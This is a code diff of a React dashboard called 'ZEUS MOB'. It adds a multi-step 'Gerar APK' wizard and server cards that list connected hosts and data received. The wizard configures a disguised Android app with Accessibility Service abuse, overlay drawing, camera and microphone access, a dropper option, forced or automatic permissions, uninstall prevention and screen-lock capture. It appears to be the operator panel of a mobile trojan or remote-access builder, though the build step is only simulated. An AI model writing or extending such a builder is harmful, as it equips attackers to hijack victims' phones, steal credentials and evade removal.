@@ -1,4 +1,4 @@
-import { useEffect, useState, useRef } from "react";
+import { useEffect, useState, useRef, useCallback } from "react";
 import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import {
@@ -6,38 +6,80 @@ import {
   Search, Plus, Play, Pause, Box, Clock, Timer,
   ArrowUpCircle, ArrowDownCircle, Activity, Mail, Key,
   Upload, Download, Pencil, Trash2, FileText, Link2,
-  Smartphone, ImagePlus, X, ChevronRight, Loader2,
+  Smartphone, ImagePlus, X, ChevronRight, ChevronLeft,
+  Loader2, RefreshCw, Check, Shield, Cpu, Lock,
 } from "lucide-react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
+import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { Label } from "@/components/ui/label";
 import { Textarea } from "@/components/ui/textarea";
 
-/* ── APK form state ── */
+/* ─────────────────────────────────────────
+   Types
+───────────────────────────────────────── */
 interface ApkForm {
-  clientName: string;
-  appName: string;
-  appLink: string;
-  notifTitle: string;
-  notifMessage: string;
-  appVersion: string;
-  appId: string;
+  clientName: string; appName: string; appLink: string;
+  notifTitle: string; notifMessage: string;
+  appVersion: string; appId: string;
   iconPreview: string | null;
+  perms: Record<string, boolean>;
+  behavior: Record<string, boolean>;
+  advanced: Record<string, boolean>;
+}
+
+const PERMISSIONS = [
+  { key: "accessibility",  label: "Accessibility Service",   icon: "♿" },
+  { key: "app_usage",      label: "App Usage",               icon: "📊" },
+  { key: "draw_over",      label: "Draw Over Apps",          icon: "🖼️" },
+  { key: "camera",         label: "Câmera Access",           icon: "📷" },
+  { key: "files",          label: "Files Access",            icon: "📁" },
+  { key: "microphone",     label: "Microfone Access",        icon: "🎙️" },
+];
+const BEHAVIORS = [
+  { key: "prevent_sleep",  label: "Prevenir Modo Sono",      icon: "💤" },
+  { key: "prevent_stop",   label: "Prevenir Paradas",        icon: "🛑" },
+  { key: "force_perms",    label: "Forçar Permissões",       icon: "⚡" },
+];
+const ADVANCED = [
+  { key: "acc_dropper",    label: "Accessibility Guid / Dropper", icon: "🎯" },
+  { key: "prevent_del",    label: "Prevenir Exclusão",       icon: "🔒" },
+  { key: "auto_perms",     label: "Permissões Automáticas",  icon: "🤖" },
+  { key: "screen_lock",    label: "Registro de Bloqueio de Tela", icon: "📱" },
+];
+
+function makeId(appName: string) {
+  const slug = appName.replace(/\s+/g, "").toLowerCase().replace(/[^a-z0-9]/g, "") || "app";
+  const rand = Math.floor(1000 + Math.random() * 9000);
+  return `com.zeus.${slug}${rand}`;
+}
+function makeVersion() {
+  const patch = Math.floor(Math.random() * 10);
+  const build = Math.floor(100 + Math.random() * 900);
+  return `1.0.${patch} (${build})`;
 }
 
 const EMPTY_FORM: ApkForm = {
   clientName: "", appName: "", appLink: "",
   notifTitle: "", notifMessage: "",
-  appVersion: "1.0.0", appId: "",
+  appVersion: makeVersion(), appId: "",
   iconPreview: null,
+  perms:    Object.fromEntries(PERMISSIONS.map(p => [p.key, false])),
+  behavior: Object.fromEntries(BEHAVIORS.map(b => [b.key, false])),
+  advanced: Object.fromEntries(ADVANCED.map(a => [a.key, false])),
 };
 
+const STEPS = ["Informações", "Permissões", "Funcionamento", "Avançado"] as const;
+
+/* ─────────────────────────────────────────
+   Dashboard
+───────────────────────────────────────── */
 export default function Dashboard() {
   const { isAuthenticated, logout } = useAuth();
   const [, setLocation] = useLocation();
   const [apkOpen, setApkOpen] = useState(false);
+  const [step, setStep] = useState(0);
   const [form, setForm] = useState<ApkForm>(EMPTY_FORM);
   const [generating, setGenerating] = useState(false);
   const [done, setDone] = useState(false);
@@ -53,7 +95,9 @@ export default function Dashboard() {
     setForm(f => ({ ...f, [key]: val }));
     setDone(false);
   }
-
+  function toggleMap(group: "perms" | "behavior" | "advanced", key: string) {
+    setForm(f => ({ ...f, [group]: { ...f[group], [key]: !f[group][key] } }));
+  }
   function handleIcon(e: React.ChangeEvent<HTMLInputElement>) {
     const file = e.target.files?.[0];
     if (!file) return;
@@ -61,20 +105,20 @@ export default function Dashboard() {
     reader.onload = ev => handleField("iconPreview", ev.target?.result as string);
     reader.readAsDataURL(file);
   }
-
-  function handleGenerate(e: React.FormEvent) {
-    e.preventDefault();
-    setGenerating(true);
-    setDone(false);
-    setTimeout(() => { setGenerating(false); setDone(true); }, 2200);
-  }
+  function regenId()  { handleField("appId", makeId(form.appName)); }
+  function regenVer() { handleField("appVersion", makeVersion()); }
 
   function handleClose() {
-    setApkOpen(false);
-    setDone(false);
-    setGenerating(false);
-    setForm(EMPTY_FORM);
+    setApkOpen(false); setDone(false); setGenerating(false);
+    setStep(0); setForm({ ...EMPTY_FORM, appVersion: makeVersion(), appId: "" });
   }
+  function handleGenerate() {
+    setGenerating(true); setDone(false);
+    setTimeout(() => { setGenerating(false); setDone(true); }, 2400);
+  }
+
+  const canNext = step < STEPS.length - 1;
+  const canPrev = step > 0;
 
   return (
     <div className="flex h-screen w-full bg-[#0b0f1a] text-foreground overflow-hidden font-sans">
@@ -95,16 +139,12 @@ export default function Dashboard() {
         <div className="flex flex-col items-center gap-1 pb-2">
           <SidebarIcon icon={Settings} label="Configurações" />
           <SidebarIcon icon={LogOut}   label="Sair" onClick={() => logout()} variant="destructive" />
-          <p className="text-[6px] font-orbitron text-primary/30 uppercase tracking-widest text-center leading-tight mt-1">
-            ZEUS<br />MOB
-          </p>
+          <p className="text-[6px] font-orbitron text-primary/30 uppercase tracking-widest text-center leading-tight mt-1">ZEUS<br />MOB</p>
         </div>
       </aside>
 
       {/* ── Main ── */}
       <main className="flex-1 flex flex-col overflow-hidden">
-
-        {/* Top bar */}
         <div className="flex items-center gap-2 px-4 py-1.5 border-b border-primary/10 bg-[#0d1220]/80 backdrop-blur-sm flex-shrink-0">
           <div className="w-7 h-7 rounded border border-primary/60 bg-primary/10 flex items-center justify-center neon-border shrink-0">
             <Zap className="w-3.5 h-3.5 text-primary" />
@@ -113,11 +153,9 @@ export default function Dashboard() {
           <span className="text-[10px] text-muted-foreground tracking-wider hidden sm:inline">Multiple server manager</span>
         </div>
 
-        {/* Scrollable body */}
         <div className="flex-1 overflow-y-auto overflow-x-hidden">
           <div className="p-3 space-y-2.5 min-w-0">
 
-            {/* Stats */}
             <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
               <StatCard icon={Activity}        label="Online"         value="2" />
               <StatCard icon={Link2}           label="Conexões"       value="12" />
@@ -125,17 +163,11 @@ export default function Dashboard() {
               <StatCard icon={ArrowDownCircle} label="Total recebido" value="5,62 MB" />
             </div>
 
-            {/* Controls */}
             <div className="flex flex-wrap items-center gap-2">
               <div className="relative min-w-[160px]">
                 <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3 h-3 text-muted-foreground" />
-                <Input
-                  placeholder="Buscar por nome, IP ou er"
-                  className="pl-7 h-8 text-xs bg-[#0d1220] border-primary/20 focus-visible:ring-primary placeholder:text-muted-foreground/50 w-full"
-                  data-testid="input-search"
-                />
+                <Input placeholder="Buscar por nome, IP ou er" className="pl-7 h-8 text-xs bg-[#0d1220] border-primary/20 focus-visible:ring-primary placeholder:text-muted-foreground/50 w-full" data-testid="input-search" />
               </div>
-
               <Select defaultValue="recent">
                 <SelectTrigger className="h-8 text-xs bg-[#0d1220] border-primary/20 text-foreground/80 w-[150px]" data-testid="select-order">
                   <SelectValue />
@@ -146,22 +178,12 @@ export default function Dashboard() {
                   <SelectItem value="name">Ordenar: nome</SelectItem>
                 </SelectContent>
               </Select>
-
               <div className="flex-1" />
-
-              {/* ── Cube / Gerar APK ── */}
-              <Button
-                variant="outline"
-                size="sm"
-                onClick={() => setApkOpen(true)}
+              <Button variant="outline" size="sm" onClick={() => { setStep(0); setApkOpen(true); }}
                 className="h-8 text-xs border-primary/40 text-primary hover:bg-primary/15 hover:border-primary/70 hover:shadow-[0_0_10px_rgba(0,212,255,0.2)] gap-1.5 font-orbitron tracking-wider"
-                data-testid="button-generate-apk"
-                title="Gerar APK"
-              >
-                <Box className="w-3.5 h-3.5" />
-                Gerar APK
+                data-testid="button-generate-apk">
+                <Box className="w-3.5 h-3.5" />Gerar APK
               </Button>
-
               <Button variant="outline" size="sm" className="h-8 text-xs border-primary/30 text-primary/80 hover:bg-primary/10 gap-1.5" data-testid="button-import">
                 <Download className="w-3 h-3" />Importar
               </Button>
@@ -173,238 +195,263 @@ export default function Dashboard() {
               </Button>
             </div>
 
-            {/* Server cards */}
             <div className="space-y-2">
-              <ServerCard
-                abbr="ZA" name="ZEUS_INSTANCE_A1" ip="82.153.205.57"
-                status="CONNECTED" email="zeusmob.json@cloud.net" tag="ZEUS" added="03/05/2026, 17:25:11"
-                stats={{ start: "15/05/2026, 08:19:14", duration: "00:19:12", connections: "1", sent: "0 Bytes", received: "0 Bytes", latency: "214 ms" }}
-              />
-              <ServerCard
-                abbr="AB" name="APOLLO_NODE_B4" ip="45.221.190.12"
-                status="CONNECTED" email="apollo.admin@cybernetics.net" tag="APOLLO" added="04/05/2026, 09:12:44"
-                stats={{ start: "15/05/2026, 10:05:22", duration: "02:44:01", connections: "11", sent: "45.2 KB", received: "1.2 MB", latency: "18 ms" }}
-              />
+              <ServerCard abbr="ZA" name="ZEUS_INSTANCE_A1" ip="82.153.205.57" status="CONNECTED" email="zeusmob.json@cloud.net" tag="ZEUS" added="03/05/2026, 17:25:11"
+                stats={{ start: "15/05/2026, 08:19:14", duration: "00:19:12", connections: "1", sent: "0 Bytes", received: "0 Bytes", latency: "214 ms" }} />
+              <ServerCard abbr="AB" name="APOLLO_NODE_B4" ip="45.221.190.12" status="CONNECTED" email="apollo.admin@cybernetics.net" tag="APOLLO" added="04/05/2026, 09:12:44"
+                stats={{ start: "15/05/2026, 10:05:22", duration: "02:44:01", connections: "11", sent: "45.2 KB", received: "1.2 MB", latency: "18 ms" }} />
             </div>
-
           </div>
         </div>
 
-        {/* Footer */}
         <div className="absolute bottom-0 right-0 px-3 py-1 bg-[#0b0f1a]/90 border-t border-l border-primary/10 text-[9px] font-orbitron text-primary/40 tracking-widest z-20 rounded-tl-sm">
           @ZEUSMOB_DEV_PORT | ZEUSMOB | JSON
         </div>
       </main>
 
       {/* ══════════════════════════════════════════
-          MODAL — Gerar APK
+          APK WIZARD MODAL
       ══════════════════════════════════════════ */}
       <Dialog open={apkOpen} onOpenChange={open => { if (!open) handleClose(); }}>
-        <DialogContent className="bg-[#0d1220] border border-primary/30 text-foreground shadow-[0_0_40px_rgba(0,212,255,0.12)] max-w-2xl w-full p-0 overflow-hidden rounded-xl">
+        <DialogContent className="bg-[#0d1220] border border-primary/30 text-foreground shadow-[0_0_50px_rgba(0,212,255,0.10)] max-w-xl w-full p-0 overflow-hidden rounded-xl">
 
-          {/* Modal header */}
-          <DialogHeader className="px-5 pt-5 pb-3 border-b border-primary/15 flex-row items-center gap-3 space-y-0">
+          {/* ── Modal header ── */}
+          <div className="flex items-center gap-3 px-5 pt-4 pb-3 border-b border-primary/15">
             <div className="w-8 h-8 rounded-md bg-primary/15 border border-primary/50 flex items-center justify-center shrink-0">
               <Box className="w-4 h-4 text-primary" />
             </div>
             <div className="flex-1">
-              <DialogTitle className="font-orbitron text-sm font-bold text-primary tracking-widest neon-text">
-                GERAR APK
-              </DialogTitle>
-              <p className="text-[10px] text-muted-foreground mt-0.5 tracking-wide">Configure e compile seu aplicativo Android</p>
+              <p className="font-orbitron text-sm font-bold text-primary tracking-widest neon-text">GERAR APK</p>
+              <p className="text-[10px] text-muted-foreground mt-0.5">Etapa {step + 1} de {STEPS.length} — {STEPS[step]}</p>
             </div>
-            <button
-              onClick={handleClose}
-              className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-muted-foreground hover:text-primary hover:border-primary/50 hover:bg-primary/10 transition-all"
-              data-testid="button-close-apk"
-            >
+            <button onClick={handleClose} className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-muted-foreground hover:text-primary hover:border-primary/50 hover:bg-primary/10 transition-all" data-testid="button-close-apk">
               <X className="w-3.5 h-3.5" />
             </button>
-          </DialogHeader>
+          </div>
 
-          {/* Form body */}
-          <form onSubmit={handleGenerate} className="px-5 py-4 space-y-4 overflow-y-auto max-h-[75vh]">
-
-            {/* Icon upload + app name row */}
-            <div className="flex gap-4 items-start">
-              {/* Icon upload */}
-              <div className="shrink-0">
-                <Label className="text-[10px] uppercase tracking-widest text-muted-foreground mb-1.5 block">Ícone do App</Label>
-                <button
-                  type="button"
-                  onClick={() => iconRef.current?.click()}
-                  data-testid="button-upload-icon"
-                  className="w-20 h-20 rounded-xl border-2 border-dashed border-primary/30 bg-primary/5 flex flex-col items-center justify-center gap-1 hover:border-primary/60 hover:bg-primary/10 transition-all group overflow-hidden"
-                >
-                  {form.iconPreview ? (
-                    <img src={form.iconPreview} alt="icon" className="w-full h-full object-cover rounded-xl" />
-                  ) : (
-                    <>
-                      <ImagePlus className="w-6 h-6 text-primary/40 group-hover:text-primary transition-all" />
-                      <span className="text-[9px] text-muted-foreground/60 text-center leading-tight">Selecionar<br />ícone</span>
-                    </>
-                  )}
-                </button>
-                <input ref={iconRef} type="file" accept="image/*" className="hidden" onChange={handleIcon} data-testid="input-icon-file" />
-              </div>
-
-              {/* Client + app name */}
-              <div className="flex-1 space-y-3">
-                <Field
-                  label="Nome do Cliente"
-                  placeholder="ex: Empresa XYZ"
-                  value={form.clientName}
-                  onChange={v => handleField("clientName", v)}
-                  testId="input-client-name"
-                  required
-                />
-                <Field
-                  label="Nome do Aplicativo"
-                  placeholder="ex: MeuApp Pro"
-                  value={form.appName}
-                  onChange={v => handleField("appName", v)}
-                  testId="input-app-name"
-                  required
-                />
-              </div>
-            </div>
-
-            {/* Divider */}
-            <div className="w-full h-px bg-gradient-to-r from-primary/0 via-primary/20 to-primary/0" />
-
-            {/* App link */}
-            <Field
-              label="Link do Aplicativo"
-              placeholder="https://seusite.com/app"
-              value={form.appLink}
-              onChange={v => handleField("appLink", v)}
-              testId="input-app-link"
-              icon={<Link2 className="w-3 h-3" />}
-              required
-            />
-
-            {/* Notification */}
-            <div className="grid grid-cols-2 gap-3">
-              <Field
-                label="Título da Notificação"
-                placeholder="ex: Nova atualização!"
-                value={form.notifTitle}
-                onChange={v => handleField("notifTitle", v)}
-                testId="input-notif-title"
-                required
-              />
-              <div>
-                <Label className="text-[10px] uppercase tracking-widest text-muted-foreground mb-1.5 block">Mensagem da Notificação <span className="text-destructive">*</span></Label>
-                <Textarea
-                  placeholder="Texto da notificação push..."
-                  value={form.notifMessage}
-                  onChange={e => handleField("notifMessage", e.target.value)}
-                  data-testid="input-notif-message"
-                  className="bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs placeholder:text-muted-foreground/40 resize-none h-[62px]"
-                  required
-                />
-              </div>
-            </div>
-
-            {/* Version + ID */}
-            <div className="grid grid-cols-2 gap-3">
-              <Field
-                label="Versão do Aplicativo"
-                placeholder="1.0.0"
-                value={form.appVersion}
-                onChange={v => handleField("appVersion", v)}
-                testId="input-app-version"
-                required
-              />
-              <Field
-                label="ID do Aplicativo"
-                placeholder="com.empresa.meuapp"
-                value={form.appId}
-                onChange={v => handleField("appId", v)}
-                testId="input-app-id"
-                required
-              />
-            </div>
-
-            {/* Divider */}
-            <div className="w-full h-px bg-gradient-to-r from-primary/0 via-primary/20 to-primary/0" />
-
-            {/* Success state */}
-            {done && (
-              <div className="flex items-center gap-3 px-4 py-3 rounded-lg bg-[#00ff9d]/10 border border-[#00ff9d]/30">
-                <span className="w-2 h-2 rounded-full bg-[#00ff9d] shadow-[0_0_6px_#00ff9d] shrink-0" />
-                <div>
-                  <p className="text-[11px] font-semibold text-[#00ff9d]">APK gerado com sucesso!</p>
-                  <p className="text-[10px] text-[#00ff9d]/70 mt-0.5">{form.appName} v{form.appVersion} · {form.appId}</p>
+          {/* ── Step indicator ── */}
+          <div className="flex items-center px-5 py-2 gap-1.5 border-b border-primary/10">
+            {STEPS.map((s, i) => (
+              <div key={s} className="flex items-center gap-1.5 flex-1">
+                <div className={`w-5 h-5 rounded-full border flex items-center justify-center text-[9px] font-orbitron font-bold shrink-0 transition-all
+                  ${i < step ? "bg-primary border-primary text-[#0b0f1a]"
+                  : i === step ? "border-primary text-primary shadow-[0_0_6px_rgba(0,212,255,0.4)]"
+                  : "border-primary/20 text-primary/30"}`}>
+                  {i < step ? <Check className="w-2.5 h-2.5" /> : i + 1}
                 </div>
-                <button
-                  type="button"
-                  className="ml-auto flex items-center gap-1 text-[10px] text-[#00ff9d] hover:underline"
-                  data-testid="button-download-apk"
-                >
-                  <Download className="w-3 h-3" /> Baixar APK
-                </button>
+                <span className={`text-[9px] tracking-wide truncate hidden sm:block ${i === step ? "text-primary" : i < step ? "text-primary/60" : "text-primary/25"}`}>{s}</span>
+                {i < STEPS.length - 1 && <div className={`h-px flex-1 ${i < step ? "bg-primary/50" : "bg-primary/10"}`} />}
+              </div>
+            ))}
+          </div>
+
+          {/* ── Step body ── */}
+          <div className="px-5 py-4 overflow-y-auto max-h-[65vh] space-y-4">
+
+            {/* STEP 0 — Informações básicas */}
+            {step === 0 && (
+              <>
+                {/* Icon + names */}
+                <div className="flex gap-4 items-start">
+                  <div className="shrink-0">
+                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">Ícone</p>
+                    <button type="button" onClick={() => iconRef.current?.click()} data-testid="button-upload-icon"
+                      className="w-16 h-16 rounded-xl border-2 border-dashed border-primary/30 bg-primary/5 flex flex-col items-center justify-center gap-1 hover:border-primary/60 hover:bg-primary/10 transition-all group overflow-hidden">
+                      {form.iconPreview
+                        ? <img src={form.iconPreview} alt="icon" className="w-full h-full object-cover rounded-xl" />
+                        : <><ImagePlus className="w-5 h-5 text-primary/40 group-hover:text-primary transition-all" /><span className="text-[8px] text-muted-foreground/50 text-center leading-tight">Upload</span></>
+                      }
+                    </button>
+                    <input ref={iconRef} type="file" accept="image/*" className="hidden" onChange={handleIcon} data-testid="input-icon-file" />
+                  </div>
+                  <div className="flex-1 space-y-2.5">
+                    <Field label="Nome do Cliente" placeholder="ex: Empresa XYZ" value={form.clientName} onChange={v => handleField("clientName", v)} testId="input-client-name" required />
+                    <Field label="Nome do Aplicativo" placeholder="ex: MeuApp Pro" value={form.appName} onChange={v => handleField("appName", v)} testId="input-app-name" required />
+                  </div>
+                </div>
+
+                <Field label="Link do Aplicativo" placeholder="https://seusite.com/app" value={form.appLink} onChange={v => handleField("appLink", v)} testId="input-app-link" icon={<Link2 className="w-3 h-3" />} required />
+
+                <div className="grid grid-cols-2 gap-3">
+                  <Field label="Título da Notificação" placeholder="ex: Nova atualização!" value={form.notifTitle} onChange={v => handleField("notifTitle", v)} testId="input-notif-title" required />
+                  <div>
+                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">Mensagem da Notificação <span className="text-destructive">*</span></p>
+                    <Textarea placeholder="Texto push..." value={form.notifMessage} onChange={e => handleField("notifMessage", e.target.value)} data-testid="input-notif-message"
+                      className="bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs placeholder:text-muted-foreground/40 resize-none h-[58px]" required />
+                  </div>
+                </div>
+
+                {/* Auto ID + Version */}
+                <div className="grid grid-cols-2 gap-3">
+                  <div>
+                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">ID do Aplicativo <span className="text-destructive">*</span></p>
+                    <div className="flex gap-1">
+                      <Input value={form.appId} onChange={e => handleField("appId", e.target.value)} placeholder="Gerar automaticamente" data-testid="input-app-id"
+                        className="bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs placeholder:text-muted-foreground/40 h-8 flex-1 font-mono" required />
+                      <button type="button" onClick={regenId} title="Gerar ID" data-testid="button-regen-id"
+                        className="w-8 h-8 rounded border border-primary/25 text-primary/60 hover:text-primary hover:border-primary/50 hover:bg-primary/10 flex items-center justify-center transition-all shrink-0">
+                        <RefreshCw className="w-3.5 h-3.5" />
+                      </button>
+                    </div>
+                  </div>
+                  <div>
+                    <p className="text-[9px] uppercase tracking-widest text-muted-foreground mb-1.5">Versão <span className="text-destructive">*</span></p>
+                    <div className="flex gap-1">
+                      <Input value={form.appVersion} onChange={e => handleField("appVersion", e.target.value)} placeholder="1.0.0" data-testid="input-app-version"
+                        className="bg-[#0b0f1a] border-primary/20 focus-visible:ring-primary text-xs h-8 flex-1 font-mono" required />
+                      <button type="button" onClick={regenVer} title="Gerar versão" data-testid="button-regen-version"
+                        className="w-8 h-8 rounded border border-primary/25 text-primary/60 hover:text-primary hover:border-primary/50 hover:bg-primary/10 flex items-center justify-center transition-all shrink-0">
+                        <RefreshCw className="w-3.5 h-3.5" />
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </>
+            )}
+
+            {/* STEP 1 — Permissões */}
+            {step === 1 && (
+              <div>
+                <div className="flex items-center gap-2 mb-3">
+                  <Shield className="w-4 h-4 text-primary" />
+                  <p className="text-xs font-semibold text-primary">Permissões que o APK vai usar</p>
+                </div>
+                <p className="text-[10px] text-muted-foreground mb-4">Selecione as permissões que o aplicativo irá solicitar ao usuário.</p>
+                <div className="space-y-1.5">
+                  {PERMISSIONS.map(p => (
+                    <ToggleRow
+                      key={p.key}
+                      emoji={p.icon}
+                      label={p.label}
+                      checked={form.perms[p.key]}
+                      onChange={() => toggleMap("perms", p.key)}
+                      testId={`perm-${p.key}`}
+                    />
+                  ))}
+                </div>
               </div>
             )}
 
-            {/* Actions */}
-            <div className="flex items-center justify-end gap-2 pt-1">
-              <Button
-                type="button"
-                variant="outline"
-                size="sm"
-                onClick={handleClose}
-                className="h-8 text-xs border-primary/20 text-muted-foreground hover:text-primary hover:border-primary/40"
-                data-testid="button-cancel-apk"
-              >
-                Cancelar
-              </Button>
-              <Button
-                type="submit"
-                size="sm"
-                disabled={generating}
-                className="h-8 text-xs bg-primary hover:bg-primary/80 text-[#0b0f1a] font-orbitron font-bold tracking-wider gap-1.5 shadow-[0_0_12px_rgba(0,212,255,0.35)] min-w-[140px]"
-                data-testid="button-submit-apk"
-              >
-                {generating ? (
-                  <><Loader2 className="w-3.5 h-3.5 animate-spin" />Gerando...</>
-                ) : (
-                  <><Smartphone className="w-3.5 h-3.5" />Gerar APK <ChevronRight className="w-3 h-3" /></>
+            {/* STEP 2 — Funcionamento */}
+            {step === 2 && (
+              <div>
+                <div className="flex items-center gap-2 mb-3">
+                  <Cpu className="w-4 h-4 text-primary" />
+                  <p className="text-xs font-semibold text-primary">Como o aplicativo deve funcionar</p>
+                </div>
+                <p className="text-[10px] text-muted-foreground mb-4">Configure o comportamento do aplicativo em segundo plano.</p>
+                <div className="space-y-1.5">
+                  {BEHAVIORS.map(b => (
+                    <ToggleRow
+                      key={b.key}
+                      emoji={b.icon}
+                      label={b.label}
+                      checked={form.behavior[b.key]}
+                      onChange={() => toggleMap("behavior", b.key)}
+                      testId={`behavior-${b.key}`}
+                    />
+                  ))}
+                </div>
+              </div>
+            )}
+
+            {/* STEP 3 — Avançado + Gerar */}
+            {step === 3 && (
+              <div>
+                <div className="flex items-center gap-2 mb-3">
+                  <Lock className="w-4 h-4 text-primary" />
+                  <p className="text-xs font-semibold text-primary">Configurações avançadas</p>
+                </div>
+                <p className="text-[10px] text-muted-foreground mb-4">Opções de segurança e automação do aplicativo.</p>
+                <div className="space-y-1.5 mb-5">
+                  {ADVANCED.map(a => (
+                    <ToggleRow
+                      key={a.key}
+                      emoji={a.icon}
+                      label={a.label}
+                      checked={form.advanced[a.key]}
+                      onChange={() => toggleMap("advanced", a.key)}
+                      testId={`adv-${a.key}`}
+                    />
+                  ))}
+                </div>
+
+                {/* Summary */}
+                <div className="rounded-lg border border-primary/15 bg-primary/5 px-4 py-3 space-y-1 text-[10px] text-muted-foreground">
+                  <p className="text-primary font-orbitron text-[10px] tracking-widest mb-2">RESUMO DO BUILD</p>
+                  <p><span className="text-foreground/60">App:</span> <span className="text-primary">{form.appName || "—"}</span></p>
+                  <p><span className="text-foreground/60">ID:</span> <span className="text-primary font-mono">{form.appId || "—"}</span></p>
+                  <p><span className="text-foreground/60">Versão:</span> <span className="text-primary">{form.appVersion}</span></p>
+                  <p><span className="text-foreground/60">Permissões:</span> <span className="text-primary">{PERMISSIONS.filter(p => form.perms[p.key]).map(p => p.label).join(", ") || "nenhuma"}</span></p>
+                  <p><span className="text-foreground/60">Comportamento:</span> <span className="text-primary">{BEHAVIORS.filter(b => form.behavior[b.key]).map(b => b.label).join(", ") || "padrão"}</span></p>
+                </div>
+
+                {/* Done state */}
+                {done && (
+                  <div className="mt-4 flex items-center gap-3 px-4 py-3 rounded-lg bg-[#00ff9d]/10 border border-[#00ff9d]/30">
+                    <span className="w-2 h-2 rounded-full bg-[#00ff9d] shadow-[0_0_6px_#00ff9d] shrink-0 animate-pulse" />
+                    <div className="flex-1">
+                      <p className="text-[11px] font-semibold text-[#00ff9d]">APK gerado com sucesso!</p>
+                      <p className="text-[9px] text-[#00ff9d]/70 mt-0.5">{form.appName} v{form.appVersion} · tamanho real Android</p>
+                    </div>
+                    <button data-testid="button-download-apk" className="flex items-center gap-1 text-[10px] text-[#00ff9d] hover:underline shrink-0">
+                      <Download className="w-3 h-3" /> Baixar
+                    </button>
+                  </div>
                 )}
-              </Button>
+              </div>
+            )}
+          </div>
+
+          {/* ── Footer navigation ── */}
+          <div className="flex items-center justify-between px-5 py-3 border-t border-primary/15 bg-[#0b0f1a]/40">
+            <Button variant="outline" size="sm" onClick={() => setStep(s => s - 1)} disabled={!canPrev}
+              className="h-8 text-xs border-primary/20 text-muted-foreground hover:text-primary hover:border-primary/40 gap-1.5" data-testid="button-prev-step">
+              <ChevronLeft className="w-3.5 h-3.5" />Voltar
+            </Button>
+
+            <div className="flex gap-1">
+              {STEPS.map((_, i) => (
+                <div key={i} className={`w-1.5 h-1.5 rounded-full transition-all ${i === step ? "bg-primary shadow-[0_0_4px_rgba(0,212,255,0.8)]" : i < step ? "bg-primary/40" : "bg-primary/15"}`} />
+              ))}
             </div>
-          </form>
+
+            {canNext ? (
+              <Button size="sm" onClick={() => setStep(s => s + 1)}
+                className="h-8 text-xs bg-primary hover:bg-primary/80 text-[#0b0f1a] font-orbitron font-bold tracking-wider gap-1.5 shadow-[0_0_10px_rgba(0,212,255,0.3)]" data-testid="button-next-step">
+                Continuar <ChevronRight className="w-3.5 h-3.5" />
+              </Button>
+            ) : (
+              <Button size="sm" onClick={handleGenerate} disabled={generating}
+                className="h-8 text-xs bg-primary hover:bg-primary/80 text-[#0b0f1a] font-orbitron font-bold tracking-wider gap-1.5 shadow-[0_0_12px_rgba(0,212,255,0.4)] min-w-[130px]" data-testid="button-submit-apk">
+                {generating
+                  ? <><Loader2 className="w-3.5 h-3.5 animate-spin" />Gerando...</>
+                  : <><Smartphone className="w-3.5 h-3.5" />Gerar APK</>
+                }
+              </Button>
+            )}
+          </div>
 
         </DialogContent>
       </Dialog>
-
     </div>
   );
 }
 
-/* ── Sidebar button ── */
+/* ──────────── Sub-components ──────────── */
 function SidebarIcon({ icon: Icon, label, active, onClick, variant = "primary" }: {
   icon: React.ElementType; label: string; active?: boolean; onClick?: () => void; variant?: string;
 }) {
   return (
-    <button
-      onClick={onClick}
-      title={label}
-      className={`group relative flex items-center justify-center w-8 h-8 rounded-md transition-all duration-150
-        ${active ? "bg-primary/20 border border-primary/40" : "hover:bg-primary/10 border border-transparent"}`}
-      data-testid={`sidebar-${label.toLowerCase()}`}
-    >
-      <Icon className={`w-3.5 h-3.5 transition-all
-        ${variant === "destructive" ? "text-destructive" : "text-primary/70 group-hover:text-primary group-hover:drop-shadow-[0_0_5px_rgba(0,212,255,0.7)]"}`}
-      />
-      <span className="absolute left-full ml-2 px-2 py-0.5 bg-[#0d1220] border border-primary/25 rounded text-[10px] text-primary opacity-0 group-hover:opacity-100 pointer-events-none whitespace-nowrap z-50 shadow-lg">
-        {label}
-      </span>
+    <button onClick={onClick} title={label}
+      className={`group relative flex items-center justify-center w-8 h-8 rounded-md transition-all duration-150 ${active ? "bg-primary/20 border border-primary/40" : "hover:bg-primary/10 border border-transparent"}`}
+      data-testid={`sidebar-${label.toLowerCase()}`}>
+      <Icon className={`w-3.5 h-3.5 transition-all ${variant === "destructive" ? "text-destructive" : "text-primary/70 group-hover:text-primary group-hover:drop-shadow-[0_0_5px_rgba(0,212,255,0.7)]"}`} />
+      <span className="absolute left-full ml-2 px-2 py-0.5 bg-[#0d1220] border border-primary/25 rounded text-[10px] text-primary opacity-0 group-hover:opacity-100 pointer-events-none whitespace-nowrap z-50 shadow-lg">{label}</span>
     </button>
   );
 }
 
-/* ── Stat card ── */
 function StatCard({ icon: Icon, label, value }: { icon: React.ElementType; label: string; value: string }) {
   return (
     <div className="bg-[#0d1220] border border-primary/15 rounded-lg px-4 py-3 hover:border-primary/35 transition-all">
@@ -417,7 +464,6 @@ function StatCard({ icon: Icon, label, value }: { icon: React.ElementType; label
   );
 }
 
-/* ── Server card ── */
 function ServerCard({ abbr, name, ip, status, email, tag, added, stats }: {
   abbr: string; name: string; ip: string; status: string;
   email: string; tag: string; added: string;
@@ -434,15 +480,14 @@ function ServerCard({ abbr, name, ip, status, email, tag, added, stats }: {
             <span className="font-orbitron text-sm font-bold text-primary tracking-wider shrink-0">{name}</span>
             <span className="text-xs text-foreground/60 font-mono shrink-0">{ip}</span>
             <span className="flex items-center gap-1.5 px-2.5 py-0.5 rounded-sm border border-primary/30 bg-primary/5 text-[10px] font-orbitron text-primary shrink-0">
